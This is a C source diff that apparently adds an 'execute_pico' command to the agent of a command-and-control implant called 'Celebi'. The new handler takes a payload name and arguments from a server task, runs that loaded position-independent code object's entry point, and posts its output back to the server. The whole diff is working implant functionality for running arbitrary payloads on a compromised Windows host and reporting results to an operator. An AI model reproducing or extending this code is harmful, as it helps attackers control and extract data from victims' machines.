@@ -117,6 +117,30 @@ void agent_register(AgentState *state, TaskInfo *task) {
 	free_upload_manager(&upload);
 }
 
+void agent_execute_pico(AgentState *state, TaskInfo *task) {
+	char *name = MSVCRT$strtok(task->parameters, "\t");
+	char *args = MSVCRT$strtok(NULL, "\t");
+	
+	ResolvedPico pico = resolve_loaded_pico(&state->file_vault, name);
+	GENERIC_PICO entrypoint = (GENERIC_PICO) pico.entrypoint;
+	char *pico_output = entrypoint(args);
+	
+	if (pico_output == NULL) {
+		pico_output = "(no output)";
+	}
+	
+	TaskPostReply reply = { 0 };
+	BOOL result = perform_post(state, task, &reply, pico_output, "success");
+	
+	#ifdef CELEBI_DEBUG
+	if (result == TRUE && reply.success == 1) {
+		dprintf("Server acknowledged execute_pico output.");
+	}
+	#endif
+	
+	free_resolved_pico(&pico);
+}
+
 void process_task(TaskInfo *task, AgentState *state) {
 	if (MSVCRT$strcmp(task->command, "exit") == 0) {
 		#ifdef CELEBI_DEBUG
@@ -142,6 +166,15 @@ void process_task(TaskInfo *task, AgentState *state) {
 		#endif
 		
 		agent_register(state, task);
+		return;
+	}
+	
+	if (MSVCRT$strcmp(task->command, "execute_pico") == 0) {
+		#ifdef CELEBI_DEBUG
+		dprintf("Received execute_pico command with parameters: '%s'", task->parameters);
+		#endif
+		
+		agent_execute_pico(state, task);
 		return;
 	}
 	
